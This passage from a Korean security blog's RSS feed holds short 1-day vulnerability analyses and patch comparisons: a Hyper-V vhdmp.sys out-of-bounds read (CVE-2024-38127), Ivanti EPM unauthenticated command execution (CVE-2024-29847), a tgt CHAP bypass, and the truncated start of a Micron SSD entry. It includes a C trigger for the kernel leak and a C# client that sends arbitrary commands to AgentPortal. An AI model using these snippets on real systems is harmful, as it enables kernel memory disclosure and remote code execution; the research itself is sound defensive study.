class="hljs-keyword">if</span> ( v18 )                      <span class="hljs-comment">// IoControlCode != 0x2d1914</span>                {                  v19 = v18 - <span class="hljs-number">0xC</span>;                  <span class="hljs-keyword">if</span> ( v19 )                  {                    v20 = v19 - <span class="hljs-number">4</span>;                    <span class="hljs-keyword">if</span> ( v20 )                    {                      <span class="hljs-keyword">if</span> ( v20 == <span class="hljs-number">0xC</span> )         <span class="hljs-comment">// IoControlCode == 0x2D1940</span>                                                <span class="hljs-comment">// Call VhdmpiGetMetaInformation -&gt; VhdmpiQueryMetadata</span>                      {                        InternalScsiAddress = VhdmpiGetMetaInformation(a1, irp);                        <span class="hljs-keyword">if</span> ( InternalScsiAddress &gt;= <span class="hljs-number">0</span> )                          <span class="hljs-keyword">goto</span> LABEL_14;                        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)dword_1C0082048 &lt;= <span class="hljs-number">2</span> || !tlgKeywordOn((__int64)&amp;dword_1C0082048, <span class="hljs-number">4L</span>L) )                          <span class="hljs-keyword">goto</span> LABEL_16;                        v22 = <span class="hljs-number">4309</span>;                        pszFormat = <span class="hljs-string">&quot;VhdmpiVhdControlObjectDeviceControlHandler: query virtual disk metadata request failed (0x%08x)&quot;</span>;                        <span class="hljs-keyword">goto</span> LABEL_91;                      }                      <span class="hljs-keyword">goto</span> LABEL_227;                    }                  ...                }              }...}</code></pre><p>&#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD55C; IoControlCode&#xB97C; &#xC54C;&#xC544; &#xB0C8;&#xC73C;&#xB2C8; <code>DeviceIoControl</code>&#xC744; &#xD638;&#xCD9C;&#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. <code>DeviceIoControl</code>&#xC5D0;&#xB294; <code>VirtDisk.h</code>&#xC5D0; &#xC815;&#xC758;&#xB41C; <code>OpenVirtualDisk</code>&#xB098; <code>CreateVirtualDisk</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC5BB;&#xC5B4;&#xC9C4; &#xAC00;&#xC0C1; &#xD558;&#xB4DC; &#xB514;&#xC2A4;&#xD06C;&#xC758; HANDLE&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; CreateVirtualDisk&#xC744; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xAC00;&#xC0C1; &#xD558;&#xB4DC; &#xB514;&#xC2A4;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">DWORD status = <span class="hljs-number">0</span>;PWCHAR VhdxPath = VHDX_PATH;HANDLE Vhdx = <span class="hljs-literal">NULL</span>;GUID uniqueId;UuidCreate(&amp;uniqueId);VIRTUAL_STORAGE_TYPE VStorType = { <span class="hljs-number">0</span>, };CREATE_VIRTUAL_DISK_PARAMETERS CreateParam = {.Version = CREATE_VIRTUAL_DISK_VERSION_2,.Version2 = {.UniqueId = uniqueId,.MaximumSize = <span class="hljs-number">1073741824</span>,<span class="hljs-comment">//1GB</span>.BlockSizeInBytes = <span class="hljs-number">0</span>,.SectorSizeInBytes = <span class="hljs-number">512</span>,.PhysicalSectorSizeInBytes = <span class="hljs-number">512</span>,.ParentPath = <span class="hljs-literal">NULL</span>},};ULONG SizeUsed = <span class="hljs-number">0</span>;VStorType.DeviceId = VIRTUAL_STORAGE_TYPE_DEVICE_UNKNOWN;status = CreateVirtualDisk(&amp;VStorType,VhdxPath,VIRTUAL_DISK_ACCESS_NONE,<span class="hljs-literal">NULL</span>,CREATE_VIRTUAL_DISK_FLAG_FULL_PHYSICAL_ALLOCATION,<span class="hljs-number">0</span>,&amp;CreateParam,<span class="hljs-literal">NULL</span>,&amp;Vhdx);</code></pre><p>&#xC774;&#xD6C4; &#xC5BB;&#xC5B4;&#xC9C4; HANDLE&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; DeviceIoControl&#xC744; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">DWORD InBuffer = <span class="hljs-number">5</span>;status = DeviceIoControl(Vhdx,<span class="hljs-number">0x2d1940</span>,&amp;InBuffer,<span class="hljs-number">4</span>,OutBuffer,<span class="hljs-number">0x20</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>DeviceIoControl</code>&#xC758; <code>nOutBufferSize</code> &#xC778;&#xC790;&#xB85C; 0x20&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C; &#xC4F0;&#xC774;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; &#xADF8; &#xC774;&#xC0C1;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCDA9;&#xBD84;&#xD788; &#xD070; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD574;&#xC904; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. DeviceIoControl &#xD638;&#xCD9C;&#xC740; &#xC2E4;&#xD328;&#xD558;&#xC9C0;&#xB9CC; &#xB370;&#xC774;&#xD130;&#xB294; &#xC81C;&#xB300;&#xB85C; &#xBCF5;&#xC0AC;&#xAC00; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; OOB Read&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; Non paged pool &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xD0DC;&#xADF8;&#xB098; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB85C; &#xBCF4;&#xC774;&#xB294; &#xAC12;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/09/15/pwndorei/hyperv-1dayclass_CVE-2024-38127/image.png" alt="image.png"></p><p>&#xC704; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC740; &#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD1B5;&#xD574; &#xC2DC;&#xC2A4;&#xD15C;&#xBC84;&#xD37C;&#xC640; &#xC778;&#xC811;&#xD55C; non paged pool &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xB370;&#xC774;&#xD130;&#xC640; poc &#xC2E4;&#xD589; &#xD6C4; OOB Read&#xB41C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xAC19;&#xC74C;&#xC744; &#xBCF4;&#xC774;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="VhdmpiQueryMetaData-vhdmp-sys-10-0-22621-4036"><a href="#VhdmpiQueryMetaData-vhdmp-sys-10-0-22621-4036" class="headerlink" title="VhdmpiQueryMetaData (vhdmp.sys 10.0.22621.4036)"></a><code>VhdmpiQueryMetaData</code> (vhdmp.sys 10.0.22621.4036)</h2><pre><code class="hljs c">          <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:            v19 = *(<span class="hljs-keyword">unsigned</span> __int16 *)(v5 + <span class="hljs-number">88</span>);            *(_DWORD *)SystemBuffer = <span class="hljs-number">5</span>;LABEL_17:            <span class="hljs-keyword">if</span> ( OutputBufferLength &gt;= (<span class="hljs-keyword">int</span>)v19 + <span class="hljs-number">0x22</span> )            {              *(_BYTE *)(SystemBuffer + <span class="hljs-number">8</span>) = <span class="hljs-number">1</span>;              *(_DWORD *)(SystemBuffer + <span class="hljs-number">12</span>) = v19 + <span class="hljs-number">2</span>;              memmove((<span class="hljs-keyword">void</span> *)(SystemBuffer + <span class="hljs-number">16</span>), *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)(v5 + <span class="hljs-number">96</span>), v19);              *(_WORD *)(SystemBuffer + <span class="hljs-number">16</span> + <span class="hljs-number">2</span> * (v19 &gt;&gt; <span class="hljs-number">1</span>)) = <span class="hljs-number">0</span>;            }            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Feature_797274427__private_IsEnabledDeviceUsage() )<span class="hljs-comment">//[1]</span>            {              *(_DWORD *)(SystemBuffer + <span class="hljs-number">12</span>) = v19 + <span class="hljs-number">2</span>;LABEL_22:              *v7 = v12;<span class="hljs-comment">//[2]</span>              v17 = <span class="hljs-number">0</span>;              <span class="hljs-keyword">goto</span> LABEL_89;            }            v12 = v19 + <span class="hljs-number">34</span>;</code></pre><p>&#xAE30;&#xC874;&#xACFC; &#xB2EC;&#xB9AC; [1]&#xC5D0; else if&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5B4; OutputBuffer&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xBD80;&#xC871;&#xD558;&#xB2E4;&#xBA74; [2]&#xC5D0;&#xC11C; Output&#xC758; &#xD06C;&#xAE30;&#xB97C; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xBA74;&#xC11C; OOB Read&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><iframe width="560" height="315" src="https://www.youtube.com/embed/dj6xTMZgB-8?si=0Irm_wB0RIlHE5vp" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/hyper-v/">hyper-v</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/diffing/">diffing</category>
      
      <category domain="https://hackyboiz.github.io/tags/Hyper-V-1-day-Class/">Hyper-V 1-day Class</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-38127/">CVE-2024-38127</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/15/pwndorei/hyperv-1dayclass_CVE-2024-38127/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-29847 : Ivanti Endpoint Manager (EPM)의 데이터 검증 미흡으로 인한 Unauthenticated Command Execution 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/14/j0ker/2024-09-14/</link>
      <guid>https://hackyboiz.github.io/2024/09/14/j0ker/2024-09-14/</guid>
      <pubDate>Sat, 14 Sep 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.horizon3.ai/attack-research/attack-blog</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29847-deep-dive-ivanti-endpoint-manager-agentportal-deserialization-of-untrusted-data-remote-code-execution-vulnerability/">CVE-2024-29847 Deep Dive: Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti EPM before 2022 SU6</li><li>Ivanti EPM the 2024 September update</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AgentPortal.exe&#xC5D0;&#xB294; .Net Remoting&#xC744; &#xAD6C;&#xD604;&#xD558;&#xAE30; &#xC704;&#xD55C; IAngentProtal &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xAC00; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. IAgentPortal&#xC5D0; RunProgram &#xC635;&#xC158;&#xC744; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xBA74; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">ProcessRunProgramAction</span>(<span class="hljs-params">TaskData td, TaskData tdRef, <span class="hljs-keyword">string</span>[] data</span>)</span><span class="hljs-function"></span>{<span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">string</span> command <span class="hljs-keyword">in</span> td._commands){<span class="hljs-keyword">try</span> {Process process = <span class="hljs-keyword">new</span> Process();process.StartInfo.UseShellExecute = <span class="hljs-literal">false</span>;process.StartInfo.RedirextStadardOutput = <span class="hljs-literal">true</span>;process.StartInfo.FileName = td._target;process.StartInfo.Arguments = command; <span class="hljs-comment">// [1]</span>process.Start(); <span class="hljs-comment">// [2]</span></code></pre><p>&#xC704; &#xCF54;&#xB4DC; [1]&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xAC00;&#xC838;&#xC640; [2]&#xC5D0;&#xC11C; &#xADF8;&#xB300;&#xB85C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; command&#xC5D0; &#xB300;&#xD574; &#xC544;&#xBB34;&#xB7F0;&#xAC80;&#xC99D;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">ProcessRunProgramAction</span>(<span class="hljs-params">TaskData td, TaskData tdRef, <span class="hljs-keyword">string</span>[] data</span>)</span><span class="hljs-function"></span>{<span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">string</span> command <span class="hljs-keyword">in</span> td._commands){<span class="hljs-keyword">try</span> {Process process = <span class="hljs-keyword">new</span> Process();process.StartInfo.UseShellExecute = <span class="hljs-literal">false</span>;process.StartInfo.RedirextStadardOutput = <span class="hljs-literal">true</span>;<span class="hljs-keyword">if</span> (td._target != <span class="hljs-string">&quot;ping.exe&quot;</span> &amp;&amp; td._target != <span class="hljs-string">&quot;tracert.exe&quot;</span>)<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;process.StartInfo.FileName = td._target;process.StartInfo.Arguments = command;process.Start();</code></pre><p>&#xD328;&#xCE58;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC774; ping&#xC774;&#xB098; tracert&#xAC00; &#xC544;&#xB2C8;&#xBA74; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> ip = args[<span class="hljs-number">0</span>];<span class="hljs-keyword">var</span> port = args[<span class="hljs-number">1</span>];<span class="hljs-keyword">var</span> command = args[<span class="hljs-number">2</span>];<span class="hljs-keyword">string</span> arguments = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">if</span> (args.Length &gt; <span class="hljs-number">3</span>){   arguments = <span class="hljs-keyword">string</span>.Join(<span class="hljs-string">&quot; &quot;</span>, args, <span class="hljs-number">3</span>, args.Length - <span class="hljs-number">3</span>);}<span class="hljs-keyword">string</span> url = String.Format(<span class="hljs-string">&quot;tcp://{0}:{1}/LANDeskAgentPortal/LDSM&quot;</span>, ip, port);IAgentPortal agentPortal = (IAgentPortal)Activator.GetObject(<span class="hljs-keyword">typeof</span>(IAgentPortal), url);<span class="hljs-keyword">try</span>{    Console.WriteLine(<span class="hljs-string">&quot;Sending request.&quot;</span>);    <span class="hljs-keyword">bool</span> request_result = agentPortal.Request(<span class="hljs-string">&quot;localhost&quot;</span>, IAgentPortalBase.ActionEnum.RunProgram, command,  arguments);</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xAC04;&#xB2E8;&#xD55C; &#xB9CC;&#xD07C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xB3C4; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E8;&#xC21C;&#xD558;&#xAC8C; &#xC2E4;&#xD589;&#xD560; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB123;&#xC5B4; Agetnportal&#xC5D0; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC27D;&#xACE0; &#xC778;&#xC99D;&#xC744; &#xAC70;&#xCE58;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; CVSS3.1 9.8&#xC810;&#xC744; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/horizon3ai/CVE-2024-29847">horizon3ai/CVE-2024-29847</a></li><li><a href="https://www.zerodayinitiative.com/advisories/ZDI-24-1223/">Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ivanti/">Ivanti</category>
      
      <category domain="https://hackyboiz.github.io/tags/Endpoint-Manager/">Endpoint Manager</category>
      
      <category domain="https://hackyboiz.github.io/tags/EPM/">EPM</category>
      
      <category domain="https://hackyboiz.github.io/tags/AgentPortal/">AgentPortal</category>
      
      <category domain="https://hackyboiz.github.io/tags/Deserialization/">Deserialization</category>
      
      <category domain="https://hackyboiz.github.io/tags/Command-Execution/">Command Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/Remote-Code-Execution/">Remote Code Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/14/j0ker/2024-09-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-45751: tgt의 CHAP authentication 우회 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/11/pwndorei/2024-09-11/</link>
      <guid>https://hackyboiz.github.io/2024/09/11/pwndorei/2024-09-11/</guid>
      <pubDate>Wed, 11 Sep 2024 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://seclists.org/oss-sec/2024/q3/254&quot;&gt;https://seclist</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2024/q3/254">https://seclists.org/oss-sec/2024/q3/254</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tgt &lt; 1.0.93</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>tgt(The Linux target framework)&#xB294; iSCSI, iSER &#xB4F1;&#xC758; &#xC804;&#xC1A1; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; SCSI &#xD0C0;&#xAC9F; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>tgt&#xB294; CHAP(Challenge-Handshake Autentication Protocol) &#xC778;&#xC99D;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294;&#xB370; &#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB09C;&#xC218;(challenge)&#xB97C; <code>rand</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">chap_initiator_auth_create_challenge</span><span class="hljs-params">(struct iscsi_connection *conn)</span></span><span class="hljs-function"></span>{        <span class="hljs-keyword">char</span> *value, *p;        <span class="hljs-keyword">char</span> text[CHAP_CHALLENGE_MAX * <span class="hljs-number">2</span> + <span class="hljs-number">8</span>];        <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> chap_id;        <span class="hljs-keyword">int</span> i;        [...]        <span class="hljs-comment">/*</span><span class="hljs-comment">         * <span class="hljs-doctag">FIXME:</span> does a random challenge length provide any benefits security-</span><span class="hljs-comment">         * wise, or should we rather always use the max. allowed length of</span><span class="hljs-comment">         * 1024 for the (unencoded) challenge?</span><span class="hljs-comment">         */</span>        conn-&gt;auth.chap.challenge_size = (rand() % (CHAP_CHALLENGE_MAX / <span class="hljs-number">2</span>)) + CHAP_CHALLENGE_MAX / <span class="hljs-number">2</span>;        conn-&gt;auth.chap.challenge = <span class="hljs-built_in">malloc</span>(conn-&gt;auth.chap.challenge_size);        <span class="hljs-keyword">if</span> (!conn-&gt;auth.chap.challenge)                <span class="hljs-keyword">return</span> CHAP_TARGET_ERROR;        p = text;        <span class="hljs-built_in">strcpy</span>(p, <span class="hljs-string">&quot;0x&quot;</span>);        p += <span class="hljs-number">2</span>;        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; conn-&gt;auth.chap.challenge_size; i++) {                conn-&gt;auth.chap.challenge[i] = rand();                <span class="hljs-built_in">sprintf</span>(p, <span class="hljs-string">&quot;%.2hhx&quot;</span>, conn-&gt;auth.chap.challenge[i]);                p += <span class="hljs-number">2</span>;        }        text_key_add(conn, <span class="hljs-string">&quot;CHAP_C&quot;</span>,  text);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774;&#xB54C; &#xC704;&#xC640; &#xAC19;&#xC774; <code>srand</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC5C6;&#xC774; <code>rand</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB85C; &#xC778;&#xD574; default seed &#xAC12;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xBA74;&#xC11C; <code>rand</code>&#xAC00; &#xBC18;&#xD658;&#xD558;&#xB294; &#xB09C;&#xC218;&#xB97C; &#xC608;&#xCE21;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9E4; &#xC778;&#xC99D;&#xB9C8;&#xB2E4; &#xAE30;&#xBCF8; seed&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xBA74;&#xC11C; &#xC778;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; challenge &#xAC12;&#xB4E4;&#xACFC; &#xADF8; &#xC21C;&#xC11C;&#xAC00; &#xD56D;&#xC0C1; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; iSCSI target&#xACFC; initiator &#xC0AC;&#xC774;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xC2A4;&#xB2C8;&#xD551;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xB0B8; challenge &#xAC12;&#xC744; &#xC7AC;&#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; CHAP &#xC778;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC778;&#xC99D;&#xC774; &#xC6B0;&#xD68C;&#xB418;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; iSCSI &#xD0C0;&#xAC9F;&#xC744; &#xC870;&#xC791;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xD589;&#xC704;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="http://www.ktword.co.kr/test/view/view.php?m_temp1=567&amp;id=533">CHAP Authentication</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/random/">random</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/tgt/">tgt</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/11/pwndorei/2024-09-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-42642: Micron MX500 SSD Series 컨트롤러의 여러 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/08/l0ch/2024-09-08/</link>
      <guid>https://hackyboiz.github.io/2024/09/08/l0ch/2024-09-08/</guid>
      <pubDate>Sun, 08 Sep 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/VL4DR/CVE-2024-42642/tree/main&quot;&gt;https:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/VL4DR/CVE-2024-42642/tree/main">https://github.com/VL4DR/CVE-2024-42642/tree/main</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SM2259 Firmware version M3CR046</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC720;&#xBA85; SSD &#xC81C;&#xC870;&#xC0AC; &#xC911; &#xD558;&#xB098;&#xC778; Micron&#xC758; MX500 SSD &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>MX500 &#xC2DC;&#xB9AC;&#xC988;&#xB294; Silicon-Motion&#xC0AC;&#xC758; &#xC81C;&#xD488;&#xC778; SM2259 &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xB294; ARC &#xC544;&#xD0A4;&#xD14D;&#xCCD0; &#xAE30;&#xBC18;&#xC758; 4&#xCC44;&#xB110; SATA 6Gb/s &#xB9C8;&#xC774;&#xD06C;&#xB85C; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xB97C; &#xD0D1;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xC5D0; 